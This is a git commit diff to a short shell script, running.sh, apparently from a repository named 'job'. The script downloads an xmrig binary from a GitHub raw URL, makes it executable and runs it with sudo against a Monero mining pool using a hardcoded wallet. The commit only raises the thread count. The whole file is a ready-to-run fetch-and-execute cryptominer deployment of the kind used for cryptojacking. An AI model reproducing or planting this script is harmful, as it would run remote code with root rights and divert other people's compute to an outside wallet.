2ce5ebc6ff01e4c6fa05aaaf4870be132c600989
realxdagg <121330162+realxdagg@users.noreply.github.com>
2022-12-27 18:18:31 +0700

    Update running.sh

--- running.sh
+++ running.sh
@@ -1,3 +1,3 @@
 wget https://raw.githubusercontent.com/realxdagg/job/main/xmrig
 chmod 500 xmrig
-sudo ./xmrig --url pool.hashvault.pro:80 --user hvs1dKm9983QgJDUeGPrVmAdmJkjZ2amMhLmSomtrPCVSm6xbLKgkH4fvkRcS3A4nsdBUFZGGDsRkC5qaXp6DsUC25FZ5sjk9k --pass x --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
+sudo ./xmrig --url pool.hashvault.pro:80 --user hvs1dKm9983QgJDUeGPrVmAdmJkjZ2amMhLmSomtrPCVSm6xbLKgkH4fvkRcS3A4nsdBUFZGGDsRkC5qaXp6DsUC25FZ5sjk9k --pass x --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --threads=8
